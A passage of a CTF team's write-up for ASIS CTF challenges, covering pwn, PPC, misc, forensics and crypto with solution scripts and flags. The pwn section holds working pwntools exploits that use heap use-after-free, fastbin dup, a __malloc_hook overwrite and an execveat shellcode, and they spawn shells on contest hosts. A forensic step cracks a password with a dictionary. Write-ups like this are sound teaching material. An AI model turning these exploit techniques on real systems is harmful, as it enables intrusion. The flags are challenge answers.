heap = u64(xx.ljust(8, '\x00')) - 0x180
print 'heap:', hex(heap)
create('a', flat(heap+0x10, heap+0x70), 1)
edit(0, 'b', 'b', 2, 'n')

create(flat(0x602010), 'a', 1)
x = print_one(0)
xx = re.findall('name: (.*)\nkind', x)[0]
#libc = u64(xx.ljust(8, '\x00')) - 0x3a6870
libc = u64(xx.ljust(8, '\x00')) - 0x3e1870
print 'libc:', hex(libc)

delete(6)
#environ = libc + 0x38bf98
environ = libc + 0x3c6f38
create(flat(heap+0x10, heap+0x30), flat(environ, heap+0x30), 1)
x = print_one(0)
xx = re.findall('name: (.*)\nkind', x)[0]
stack = u64(xx.ljust(8, '\x00'))
print 'stack', hex(stack)

delete(6)
canary_addr = stack - 0x100 + 1
create(flat(canary_addr, heap+0x30), flat(heap+0x10, heap+0x30), 1)
x = print_one(0)
xx = re.findall('name: (.*)\nkind', x)[0]
canary = u64('\x00'+xx[:7])
print 'canary:', hex(canary)

# switch order
delete(6)
create(flat(heap+0x10, heap+0x30), flat(heap+0x10, heap+0x30), 1)

edit(0, 'b', 'b', 2, 'n')
delete(1)

fake_pos = stack-0x11f
print 'fake_pos:', hex(fake_pos)
create(flat(fake_pos), 'a', 1)
# fake chunk on stack
create(flat(heap+0x1b0, heap+0x210), '\x00'*7+flat(0x2100), 1, stack='1\x21\x00\x00')

# puts address on heap
delete(3)
create(flat(fake_pos+0x10), flat(fake_pos+0x10), 1)

# reset fastbin
delete(4)
delete(0)

create(flat(heap+0x160), 'b', 1,)
#raw_input("@")
magic = libc + 0xf1147
print 'magic:', hex(magic)
r.recvrepeat(1)
r.sendline('1')
r.sendlineafter('>', 'AAAA')
r.sendafter('>', flat(canary>>8)[:-1]+flat(0, magic))
r.sendlineafter('>', '6')
sleep(1)
r.sendline('ls /home/pwn; cat /home/pwn/flag')

#embed()
r.interactive()

# ASIS{5aa9607cca34dba443c2b757a053665179f3f85c}
```

### Just_sort (kevin47)

* Simple overflow and UAF problem

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from ctypes import *
import re

context.arch = 'amd64'

r = remote('159.65.125.233', 6005)

def insert(n, s):
    r.sendlineafter('>', '1')
    r.sendlineafter('>', str(n))
    r.sendafter('>', s)

def edit(h, p, s):
    r.sendlineafter('>', '2')
    r.sendlineafter('>', str(h))
    r.sendlineafter('>', str(p))
    r.sendafter('>', s)

def printt():
    r.sendlineafter('>', '3')
    return r.recvuntil('---', drop=True)

def search(n, s):
    r.sendlineafter('>', '4')
    r.sendlineafter('>', str(n))
    r.sendafter('>', s)

def delete(h, p):
    r.sendlineafter('>', '5')
    r.sendlineafter('>', str(h))
    r.sendlineafter('>', str(p))

insert(10, 'a')
insert(10, 'b')
delete(1, 0)
search(10, flat(
    [0]*3, 0x21,
    [0]*3, 0x21,
    0, 0x602018,
))
x = printt()
xx = re.findall('0: "(.*)"', x)[0]
libc = u64(xx.ljust(8, '\x00')) - 0x844f0
print 'libc:', hex(libc)
system = libc+0x45390
edit(1, 0, flat(system))
insert(40, '/bin/sh\x00')
delete(4, 0)


r.interactive()
# ASIS{67d526ef0e01f2f9bdd7bff3829ba6694767f3d1}
```

### message_me (kevin47)

* UAF
* hijack __malloc_hook with fastbin dup attack

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from ctypes import *
import re

context.arch = 'amd64'

#r = remote('127.0.0.1', 7124)
r = remote('159.65.125.233', 6003)

def add(sz, content):
    r.sendlineafter('choice : ', '0')
    r.sendlineafter('size : ', str(sz))
    r.sendlineafter('meesage : ', content)

def remove(idx):
    r.sendlineafter('choice : ', '1')
    r.sendlineafter('message : ', str(idx))

def show(idx):
    r.sendlineafter('choice : ', '2')
    r.sendlineafter('message : ', str(idx))
    return r.recvuntil('----', drop=True)

def change(idx):
    r.sendlineafter('choice : ', '3')
    r.sendlineafter('message : ', str(idx))

add(0x100-0x10, 'a')    # 0
add(100-0x10, 'a')      # 1
add(0x100-0x10, 'a')    # 2
add(100-0x10, 'a')      # 3
add(0x100-0x10, 'a')    # 4
add(100-0x10, 'a')      # 5
remove(0)
remove(2)
remove(4)
x = show(2)
xx = re.findall('Message : (.*)\n   Message', x, re.DOTALL)[0]
heap = u64(xx.ljust(8, '\x00')) - 0x2e0
x = show(4)
xx = re.findall('Message : (.*)\n   Message', x, re.DOTALL)[0]
libc = u64(xx.ljust(8, '\x00')) - 0x3c4c68
print 'heap:', hex(heap)
print 'libc:', hex(libc)

# fastbin dup
clib = CDLL("libc.so.6")
clib.srand(1)
__malloc_hook = libc + 0x3c4aed
#__malloc_hook = 0x602005
magic = libc + 0xf02a4
print 'magic:', hex(magic)
add(0x70-0x10, flat(    # 6
    0x71,
))
add(0x70-0x10, flat(0x71, __malloc_hook))     # 7
remove(6)
remove(7)
remove(6)
# 6's fd += 0x10
change(6)
change(6)
change(6)
add(0x70-0x10, flat(0xdeadbeef))
add(0x70-0x10, flat(0xdeadbeef))
add(0x70-0x10, '\x00'*3+flat(0, magic))

# trigger malloc_printerr
remove(0)
remove(0)
#r.sendlineafter('choice : ', '0')
#r.sendlineafter('size : ', '100')

r.interactive()
# ASIS{321ba5b38c9e4db97c5cc995f1451059b4e28f6a}
```

### Tinypwn (kevin47)

* Use the syscall execveat

```python2
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from ctypes import *
import re

context.arch = 'amd64'

#r = remote('127.0.0.1', 7124)
r = remote('159.65.125.233', 6009)

r.send('/bin/sh\x00'.ljust(296)+flat(0x4000ed)+'\x00'*18)

r.interactive()

# ASIS{9cea1dd8873d688649e7cf738dade84a33a508fb}
```

## PPC

### Neighbour (lwc)
$O(log N)$
```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from sage.all import *
from pwn import *

def puzzle(s):
    import string
    for i in string.printable:
        for j in string.printable:
            for k in string.printable:
                for l in string.printable:
                    if hashlib.sha256(i+j+k+l).hexdigest()[-6:] == s:
                        return i+j+k+l

r = remote('37.139.22.174', 11740)

r.recvuntil('sha256(X)[-6:] = ')
s = r.recv(6)
r.sendline(puzzle(s))

stage = 1
while True:
    r.recvuntil('n = ')
    n = Integer(r.recvline())
    print 'stage %d n = ' % stage + str(n)
    stage += 1
    ans = n - max(map(lambda i: power(Integer(floor(n.n(digits=len(str(n))).nth_root(i))), i), range(2, int(ln(n)/ln(2))+1)))

    print ans
    r.sendline(str(ans))
    r.recvuntil('To win the flag, submit r :)\n')
    tmp = r.recvline()
    print tmp
    if 'Great!' not in tmp:
        break
    if 'next' not in tmp:
        break


r.interactive()
```

### The most Boring (how2hack)
I used more time to understand the challenge description than solving this challenge ==
Basically it wants us to give 3 different string that all consecutive k characters will not repeat. As I am familiar with pwn, I quickly think of pwntools cyclic() function. Pwntools is the best tool!

```python
#!/usr/bin/env python

import itertools as it
import string
from hashlib import sha256
import multiprocessing as mp

from pwn import *

host = '37.139.22.174'
port = 56653

def check(p):
    if sha256(p).hexdigest()[-6:] == target:
        return p
    return None

def my_remote(ip, port, show=False):
    global target
    r = remote(ip, port)
    menu = r.recvuntil('Submit a printable string X, such that sha256(X)[-6:] = ', drop=True)
    if show:
        print(menu)
    target = r.recvline().strip()
    possible = string.ascii_letters+string.digits
    possible = it.imap(''.join, it.product(possible, repeat=4))
    pool = mp.Pool(32)
    log.info('PoW XXXX = %s' % (target))
    for c in pool.imap_unordered(check, possible, chunksize=100000):
        if c:
            log.info('Solved - %s' % c)
            r.sendline(c)
            break
    pool.close()
    return r

if __name__ == '__main__':
    import sys
    r = my_remote(host, port, show=True)

    while True:
        r.recvuntil('k = ')
        k = int(r.recvline().strip())
        log.info('k = ' + str(k))
        r.recvuntil('send the first sequence: \n')
        r.sendline(cyclic(alphabet='012', n=k))
        r.recvuntil('send the second sequence: \n')
        r.sendline(cyclic(alphabet='120', n=k))
        r.recvuntil('send the third sequence: \n')
        r.sendline(cyclic(alphabet='201', n=k))        

        if k == 9:
            break

    r.interactive()
```
Flag: `ASIS{67f99742bdf354228572fca52012287c}`

### Shapiro (shw)
Shapiro points are lattice points that the gcd of its coordinates is 1. In this challenge, we have to construct a `k x k` grid such that none of its point is a Shapiro point.

Take `k = 3` for example, we have to decide `x, y` such that all of the following points are not Shapiro.
```
(x+0, y+2), (x+1, y+2), (x+2, y+2)
(x+0, y+1), (x+1, y+1), (x+2, y+1)
(x+0, y+0), (x+1, y+0), (x+2, y+0)
```
The basic idea is to assign every point a prime as a common divisor of its coordinates. We let the assigned primes be different for all points, e.g.,
```
x+0 = y+0 = 0 mod 2
x+0 = y+1 = 0 mod 3
x+0 = y+2 = 0 mod 5
x+1 = y+0 = 0 mod 7
... and so on
```
According to CRT, the congruence equation exists solutions for `x, y mod P`, where `P` is the product of all primes we had used.

Note that there would be restrictions such as `the largest y coordinate smaller than k`, or `the smallest x coordinate larger than k`. However, it's lucky for us that the two restrictions `larger` and `smaller` do not occur at the same time. Thus, we can add (or minus) `x, y` with `P` to sufficiently large (or small) to satisfy the condition.
Code snippet:
```python
from gmpy import *

def find(k):
    p = next_prime(1)
    mod, rx, ry = [], [], []
    for i in range(k):
        for j in range(k):
            mod.append(p)
            rx.append((p-i)%p)
            ry.append((p-j)%p)
            p = next_prime(p)
    return mod, rx, ry

while True:
    r.recvuntil('k = ')
    k = int(r.recvline()[:-1])

    m, rx, ry = find(k)
    X = chinese_remainder(m, rx)
    Y = chinese_remainder(m, ry)

    cond = r.recvline()[:-1]
    prod = reduce(lambda x, y: x*y, m)
    if 'larger' in cond:
        lb = int(cond.split()[-1])
        q = lb/prod
        X += prod*(q+1)
        Y += prod*(q+1)
    elif 'smaller' in cond:
        q = X/prod
        X -= prod*(q+1)
        Y -= prod*(q+1)

    r.sendline(get_format(X, Y, k))
    data = r.recvline()[:-1]
    if 'please pass' not in data:
        break
```

FLAG: `ASIS{9273b8834e4972980677627fe23d96ee}`

## misc

### Plastic (sces60107)

There is a png file. Just try `zsteg`
```
$ zsteg plastic
meta XML:com.adobe.xmp.. text: "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"XMP Core 5.4.0\">\n   <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\">\n      <rdf:Description rdf:about=\"\"\n            xmlns:exif=\"http://ns.adobe.com/exif/1.0/\"\n            xmlns:tiff=\"http://ns.adobe.com/tiff/1.0/\">\n         <exif:UserComment>\n            <rdf:Alt>\n               <rdf:li xml:lang=\"x-default\">AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4&#xA;5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57&#xA;ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK&#xA;7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG&#xA;U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62&#xA;jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN&#xA;ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl&#xA;k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH&#xA;I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj&#xA;1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0&#xA;QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg&#xA;tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk&#xA;OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO&#xA;bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s&#xA;mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk&#xA;KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR&#xA;AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN&#xA;ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL&#xA;6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP&#xA;wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P&#xA;V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk&#xA;RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1&#xA;dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA==&#xA;</rdf:li>\n            </rdf:Alt>\n         </exif:UserComment>\n         <tiff:Orientation>1</tiff:Orientation>\n      </rdf:Description>\n   </rdf:RDF>\n</x:xmpmeta>\n"
```

You can notice that there is a base64-encoded string
`AAAFWHjabVRfbBRFGJ/ZOeifa+m2hVJaoNf2iohQtndX9ipS29IeVuwVe/1zbfc4&#xA;5/bm7pbu7V5255DjaDISozExaggxSIxC+2KRqBhjCPFBQwgmPggtSnySFx98IP57&#xA;ML4590dEw2w2+33fzHzz+37fbyeW0TWbStIdKCDHuvUvngi7jxPL1kwj7DZjx4hK&#xA;7Vk3ttSUxsOTbmpmGgB85cLHYntFZXtHp7trx2M7H9/1RI+/78DgoWeC4zNhJarG&#xA;U7pp0ym3kdX1tapqZ02TayYY6l4gOXuOf8t5p92qjm17pXZDnVjf0LhxExMYYg62&#xA;jq1nFaySVbHqlc3NW1pat27b3sacrIZtYHWsnrWwVraNbWeucAzbRNcMMqWaumlN&#xA;ps04maIa1Uk4YxGcjukkksZJQ0toKqa8pMk4piQq1sWwupC0zKwRP1jYOGebWUsl&#xA;k+QE7QTlsbZ7j7N7rzQVDE0cGlKCoeLCUAarZFzcJXX3+fd5fL19/j6/S+qWJLnH&#xA;I/XxIXsLrkf2eX0Sj/YCEbLaVY/X1ztXKtbAaRIumcSeKadd2if/Y4aDofEiO6Jj&#xA;1fnk/qdmOV02tTQjycQjPFH/0xx+MDSWpZhXFyrOLPcPyHxfyVkbch4cHgk88Dn0&#xA;QcqtWJYSmzWwLawxKq4qcVPNpolBi0jme6QMjeSxRTVVJ4vVStYmvNIFnCTz3Cxg&#xA;tiP5IseLri4eibsSpsVfg7qK0Yd35HHatnPpGF+ZxjRl/3+uEHzU3HyWJvyRvGZk&#xA;OFJDLR2UyOouarpoLkNccc3ivOg5bmDV0jhWl5rCFlYp12t1QWajh8cuPss2XnyO&#xA;bWLN08FQgAO8c+T5CWdocmqa+yHtJOHEJAI6TtrcD/LCOgd2lhouiqyJbZ4eMw2s&#xA;mpzp2blyhqV5uWzxaOQoJ3RYUwtqwlZuKSLz4As4KjY8xHO8RP1STH5kvHNgqHTk&#xA;KnEmkoUfg2ocyOCXfrLwp/oT28pTasf4mcNcrUsLctkqKDK9Vwr0uPgDWG2h05mR&#xA;AGsr9fRAXoklXIOh0dCiku+V0l4l6stkbCWa7R1RomNeGXPx+5RofNyQlehonyFN&#xA;ECVKU96x9nZlkR+ZPR4VGx9I698al7MRuSi6wyRH4oPlq+B27uSkZZqUQVAJ6kEL&#xA;6AR7gAfIYB5gkAIZkAenwevgDfAWOAPOgrfBOXAevAveAx+AS+Ay+Ah8Aj4Fn4HP&#xA;wVVwDXwBboBvwC3wPfgR3Ae/Qwesg82wDXZBD4xCDFWYgjY8BV+Gr8I34Tl4Hr4P&#xA;V+CH8DK8Aq/Dm/AWvAvvwfvwF/gb/EP4WvhWuC2sCd8Jd4UfhHvCz8Kvwl8IoCrk&#xA;RLWoDjWhVtSButBu1IP60SAKoHl0FNnoFHoJvYbOoLPoHXQBLaNL6Aq6iq6hr9B1&#xA;dAPddFQ4ahwdjh0Ov2O/Y6DUQQGWr4s8+M9wDP0NfUGwlA==`

But you cannot just use base64 decoder. There is something you need to do first.

You remove every `&#xA;` in the string. Then, you can use base64 decode.

After base64decoding, you still don't know what it is.
Just use `binwalk`, then you can find out that there is a zlib compressed data

The final step is decompress the data. The flag is right here
```
$ strings decompressed_data 
bplist00
wxX$versionX$objectsY$archiverT$top
!"#$%&'()*+189=AGHNOWX\_cdhlostU$null
 WNS.keysZNS.objectsV$class
 XbaselineUcolorTmodeUtitleXpreamble]magnificationTdate_
backgroundColorZsourceText#
./0UNSRGB\NSColorSpaceO
*0.9862459898 0.007120999973 0.02743400075
2345Z$classnameX$classesWNSColor
67WNSColorXNSObject
:;<YNS.string
23>?_
NSMutableString
>@7XNSString
CDEFXNSString\NSAttributes
\documentclass[10pt]{article}
\usepackage[usenames]{color} %used for font color
\usepackage{amssymb} %maths
\usepackage{amsmath} %maths
\usepackage[utf8]{inputenc} %useful to type directly diacritic characters
VNSFont
STUVVNSSizeXNSfFlagsVNSName#@(
VMonaco
23YZVNSFont
[7VNSFont
23]^\NSDictionary
23`a_
NSAttributedString
NSAttributedString#@B
fgWNS.time#A
23ijVNSDate
k7VNSDate
m/0F1 1 1
CpEF
={\bf ASIS}\{50m3\_4pps\_u5E\_M37adat4\_dOn7\_I9n0Re\_th3M!!\}
23uv_
NSMutableDictionary
u]7_
NSKeyedArchiver
yzTroot

```

The flag is `ASIS{50m3_4pps_u5E_M37adat4_dOn7_I9n0Re_th3M!!}`


## forensic

### Trashy Or Classy (sces60107 bookgin)

In this forensic challenge you will get a pcap file.

In this pcap file you will notice that someone trying to connet to the website which is located at `http://167.99.233.88/`

It's a compilicated challenge. I will try to make a long story short.

This challenge can be divided into three steps.

#### first step
In the first step, you will find an interest file from pcap which is `flag.caidx`

Just google the extension, you will see a github repo [casync](https://github.com/systemd/casync)

You also notice the `flag.caidx` is located at `http://167.99.233.88/private/flag.caidx`

There is also a suspicious direcory which is `http://167.99.233.88/private/flag.castr`

But you need the username and password for the authentication.

#### second step

The username can be found in the pcap file. It's `admin`

But we still need password. Then, you can find out that the authentication is [Digest access authentication](https://en.wikipedia.org/wiki/Digest_access_authentication)

You have everything you need to crack the password now. Just download rockyou.txt and launch a dictionary attack.

It's won't take too much time to crack the password.

Finally, the password is `rainbow`

#### third step

Now you can login and download the `flag.caidx`.

But you still cannot list `flag.castr`

You may need to install `casync`

Then you can use `test-caindex`
```
trashy/casync/build$ ./test-caindex ../../flag.caidx 
caf4408bde20bf1a2d797286b1ad360019daa59b53e55469935c6a8443c69770 (51)
b94307380cddabe9831f56f445f26c0d836b011d3cff27b9814b0cb0524718e5 (58)
4ace69b7c210ddb7e675a0183a88063a5d35dcf26aa5e0050c25dde35e0c2c07 (50)
383bd2a5467300dbcb4ffeaa9503f1b2df0795671995e5ce0a707436c0b47ba0 (50)
...
```
These message will tell you the chunk file's position.
For example, `caf4408bde20bf1a2d797286b1ad360019daa59b53e55469935c6a8443c69770.cacnk` is located at `flag.castr/caf4/caf4408bde20bf1a2d797286b1ad360019daa59b53e55469935c6a8443c69770.cacnk`

You can download all the chunk file in  `flag.castr` now.

Now you can extract the flag
```
trashy$ sudo casync extract --store=flag.castr flag.caidx wherever_you_like
trashy$ cd wherever_you_like
trashy/wherever_you_like$ ls
flag.png
```

The flaf is right here.
![](https://i.imgur.com/SSoTmJm.png)

The flag is `ASIS{Great!_y0U_CAn_g3T_7h3_casync_To0l,tHe_Content-Addressable_Data_Synchronization_T0Ol!!!}`

### Tokyo (sces60107)

Without the hint, this challenge is probably the most guessing challenge in this CTF.

We will get a binary, but it can't be recognized by any tools.

After some investigation, I got three clues from the binary.

First, there is a header at the begining of this binary. And the header begin with `KC\n`

Second, we found some interesting blocks at the end of the binary. Each block' size is 24byte. And Each block contains a printable letter.

Gather all the printable letter. It seems like you can reconstruct the flag from it in some order.

`!_Ab_ni!_as__ial_Cb_a_iSgJg_td_eKeyao_ae_spb}iIyafa{S_r__ora3atnsonnoti_faon_imn_armtdrua`

Third, this binary contains lots of null byte. However, beside the begining and the end, we can still find some non-null byte in the binary.

Totally, I found 89 blocks in the binary and each blocks is 3 byte long.
what a coincidence! The length of flag is also 89.

These blocks are big-endian-encoded. Their values go from 787215 to 787479, increasing 3 by 3.

That's all the clue. Unfortunately, no one can solve this challenge. So, the host release the hint `Kyoto Cabinet`

Now we know this file is [kyoto cabinet](http://fallabs.com/kyotocabinet/) database

`KC\n` is the magic signatrure of kyoto cabinet database file.

According the header, we can also find out that it is a hashdatabase.

After understanding the mechanism of kypto cabinet database, the end of the database is the record section.

Those 3-byte-long blocks is buckets.

![](https://i.imgur.com/WcskOZg.png)

So, the last question is what the key is.

According to record section, we will know the key size which is 3 byte long.

After several attempts, I found out the keys of the flag go from "000" to "088"

It's time to reconstruct the flag
```python
from pwn import *
import kyotocabinet


def haha(a):
  k=a.encode("hex")
  return int(k,16)
f=open("tokyo").read()
j=f[0x30:]

temp=[]
flag=False
kk=""
pos=0
hh=[]
for i in range(len(j)):
  if j[i]!="\x00":
    if flag:
      kk+=j[i]
    else:
      kk=j[i]
      flag=True
  else:
    if flag:
      if kk=="\xcc\x04":
        pos=i
        break
      temp.append(kk)
      kk=""
      flag=False
      hh.append(i-3)


t=j[pos:]
t2=[]
flag=False
kk=""
for i in range(len(t)):
  if t[i]!="\x00":
    if flag:
      kk+=t[i]
    else:
      kk=t[i]
      flag=True
  else:
    if flag:
      if len(kk)<2 or kk[1]!="\xee":
        kk=""
        continue
      t2.append(kk[0])
      kk=""
      flag=False
i=map(haha,temp)



flag = "".join(t2)
flag2=""
for k in map(haha,temp):
  v=sorted(i).index(k)
  flag2+=flag[(v)%89]
print flag
print flag2

indd=[]
for i in range(89):
  j=str(i).rjust(3,"0")
  temp=kyotocabinet.hash_murmur(j)
  indd.append(temp%0x100007)


flag3=""
for k in indd:
  v=sorted(indd).index(k)
  flag3+=flag2[(v)%89]
print flag3
```

This code is not a clean code. I'm sorry about that.

By the way, the flag is `ASIS{Kyoto_Cabinet___is___a_library_of_routines_for_managing_a_database_mad3_in_Japan!_!}`

## crypto

### the_early_school (shw)
```python
from Crypto.Util.number import *

def dec(s):
    if len(s) % 3 == 2:
        return dec(s[:-2]) + s[-2]
    r = ''
    for i in range(0, len(s), 3):
        r += s[i:i+2]
    return r

with open('FLAG.enc', 'rb') as f:
    s = f.read()
ENC = bin(bytes_to_long(s))[2:]

for i in xrange(1 << 30):
    ENC = dec(ENC)
    a = long_to_bytes(int(ENC, 2))
    if 'ASIS' in a:
        print a
        break
```
FLAG: `ASIS{50_S1mPl3_CryptO__4__warmup____}`

### Iran (shw and sasdf)

#### First-half
We know how the key is generated.
```python
key_0 = keysaz(gmpy.next_prime(r+s), gmpy.next_prime((r+s)<<2))
```
Let `p = next_prime(r+s)` and `q = next_prime((r+s)<<2)`, we have that `4p ≈ q` (approximately equal). Thus, `N = pq ≈ q^2/4` and `q ≈ sqrt(4*N)`. We can try to brute force `q` to get the correct `(p, q)` pair.
```python
from decimal import *
import gmpy

getcontext().prec = 1000
t = Decimal(4*N).sqrt()
t = int(t)

for i in range(10000):
    q = t - i # or try t + i
    if n % q != 0:
        continue
    p = n / q
    assert(gmpy.is_prime(p) and gmpy.is_prime(q))
    print 'p =', p
    print 'q =', q
```
After we get `p, q`, we can decrypt `enc_0` to get the first half of flag.
```python
def decrypt(a, b, m):
    n, e = a*b, 65537
    d = gmpy.invert(e, (a-1)*(b-1))
    key = RSA.construct((long(n), long(e), long(d)))
    dec = key.decrypt(m)
    return dec

print decrypt(p, q, c) # ASIS{0240093faf9ce
```
Also, we can get the range of `u = r+s` by
```python
def prev_prime(p):
    for i in xrange(1, 1<<20):
        if gmpy.next_prime(p-i) != p:
            return p-i+1
        
u_min = max(prev_prime(p), (prev_prime(q)/4)+1)
u_max = min(p-1, q/4)
```
